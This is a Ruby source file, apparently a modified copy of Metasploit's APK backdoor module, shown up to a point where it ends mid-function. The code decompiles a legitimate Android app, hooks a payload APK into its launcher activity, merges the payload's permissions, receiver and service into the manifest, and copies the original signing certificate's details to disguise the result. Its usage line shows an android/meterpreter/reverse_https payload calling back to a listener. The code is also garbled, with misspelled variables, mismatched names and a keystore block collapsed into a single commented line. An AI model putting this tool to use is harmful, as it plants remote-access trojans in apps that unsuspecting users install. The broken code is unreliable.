#!/usr/bin/env ruby

require 'msf/core'
require 'rex/text'
require 'tmpdir'
require 'nokogiri'
require 'fileutils'
require 'optparse'
require 'open3'
require 'date'

class MSF::Payload::Apk

  def print_status(msg='')
    $stderr.puts "[*] #{msg}"
  end

  def print_error(msf='')
    $stderr.puts "[-] #{msg}"
  end

  alias_method :print_bad, :print_error

  def usage
    print_error "Usage: #{$0} -x [target.apk] [msfvenom option]\n"
    print_error "e.g. #{$0} -x messager.apk -p andorid/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
  end

  def run_cmd(cmd)
    begin
      stdin, stdout, stderr = Open3.popen3(cmd)
      return stdout.read + stderr.read
    rescue Errno::ENOENT
      return nil
    end
  end

  #find a suitable smali point to hook
  def find_hook_point(amanifest)
    package = amanifest.xpath('//manifest').first['package']
    application = amanifest.xpath('//application')
    application_name = application.attribute("name")
    if application_name
      return application_name.to_s
    end
    activites = manifest.xpath("//activity|//activity-alias")
    for activity in activites
      activityname = activity.attribute("targetActivity")
      unless activtiyname
        activityname = activity.attribute("name")
      end
      category = activity.search('category')
      unless category
        next
      end
      for cat in category
        categoryname = cat.attribute('name')
        if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
          name = activityname.to_s
          if name.start_with?('.')
            name = package + name
          end
          return name
        end
      end
    end
  end

  def parse_manifest(manifest_file)
    File.open(manifest_file, "rb"){|file|
      data = File.read(file)
      return Nokogiri::XML(data)
    }
  end

  def fix_manifest(tempdir, package, main_service, main_broadcast_receiver)
    #Load payload's manifest
    payload_manifest = parse_manifest("#{tempdir}/payload/AndroidManifest.xml")
    payload_permissions = payload_manifest.xpath("//manifest/uses-permission")

    #Load original apk's manifest
    original_manifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
    original_permissions = original_manifest.xpath("//manifest/uses-permission")

    old_permissions = []
    add_permissions = []

    original_permissions.each do |permission|
      name = permission.attribute("name").to_s
      old_permissions << name
    end

    application = original_manifest.xpath('//manifest/application')
    payload_permissions.each do |permission|
      name = permission.attribute("name").to_s
      unless old_permissions.include?(name)
        add_permissions += [permission.to_xml]
      end
    end
    add_permissions.shuffle!
    for permission_xml in add_permissions
      print_status("Adding #{permission_xml}")
      if original_permissions.empty?
        application.before(permission_xml)
        original_permissions = original_manifest.xpath("//manifest/uses-permission")
      else
        original_permissions.before(permission_xml)
      end
    end

    application = original_manifest.at_xpath('/manifest/application')
    receiver = payload_manifest.at_xpath('/manifest/application/receiver')
    service = payload_manifest.at_xpath('/manifest/application/service')
    receiver.attributes["name"].value = package + '.' + main_broadcast_receiver
    receiver.attributes["label"].value = main_broadcast_receiver
    service.attributes["name"].value = package + '.' + main_service
    application << receiver.to_xml
    application << service.to_xml

    File.open("#{tempdir}/orignial/AndroidManifest.xml", "wb") { |file| file.puts original_manifest.to_xml}
  end
  
  def parse_orig_cert_data(orig_apkfile)
      orig_cert_data = Array[]
      keytool_output = run_cmd("keytool -J-Duser.language=en -printcert -jarfile '#{orig_apkfile}'")
      owner_line = keytool_output.match(/^Owner:.+/)[0]
      orig_cert_dname = owner_line.gsub(/^.*:/, '').strip
      orig_cert_data.push("#{orig_cert_dname}")
      valid_from_line = keytool_output.match(/^Valid from:.+/)[0]
      from_date_str = valid_from_line.gsub(/^Valid from:/, '').gsub(/until:.+/, '').strip
      to_date_str = valid_from_line.gsub(/^Valid from:.+until:/, '').strip
      from_date = DateTime.parse("#{from_date_str}")
      orig_cert_data.push(from_date.strftime("%Y/%m/%d %T"))
      to_date = DateTime.parse("#{to_date_str}")
      validity = (to_date - from_date).to_i
      orig_cert_data.push("#{validity}")
      return orig_cert_data
  end
  
  def backdoor_apk(apkfile, raw_payload)
      unless apkfile && File.readable?(apkfile)
          usage
          raise RuntimeError, "Invalid template: #{apkfile}"
      end
      
      #Create temporary directory where work will be done
      tempdir = Dir.mktmpdir
      
      #keystore = "#{tempdir}/signing.keystore"torepass = "android"keypass = "androidkeyalias = "signing.key"orig_cert_data = parse_orig_cert_data(apkfile)orig_cert_dname = orig_cert_data[0]orig_cert_startdate = orig_cert_data[orig_cert_validity = orig_cert_data[2]
      
      print_status "Creating signing key and keystore..\n"
      #run_cmd("keytool -genkey -v -keystore{keystore} \alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \-keysize 2048 -startdate '#{orig_cert_startdate}' \mm-validity #{orig_cert_validity} -dname#{orig_cert_dname}'")
      
      File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
      FileUtils.cp apkfile, "#{tempdir}/original.apk"
      
      print_status "Decompiling original APK..\n"
      run_cmd("apktool d -f -r --force-manifest #{tempdir}/original.apk -o #{tempdir}/original")
      print_status "Decompiling payload APK..\n"
      run_cmd("apktool d -f -r --force-manifest #{tempdir}/payload.apk -o #{tempdir}/payload")
      
      amanifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
      
      print_status "Locating hook point..\n"
      hookable_class = find_hook_point(amanifest)
      smalifile = "#{tempdir}/original/smali*/" + hookable_class.gsub(/\./, "/") + ".smali"
      smalifiles = Dir.glob(smalifile)
      for smalifile in smalifiles
          if File.readable?(smalifile)
              hooksmali = File.read(smalifile)
              break
          end
      end
            
            
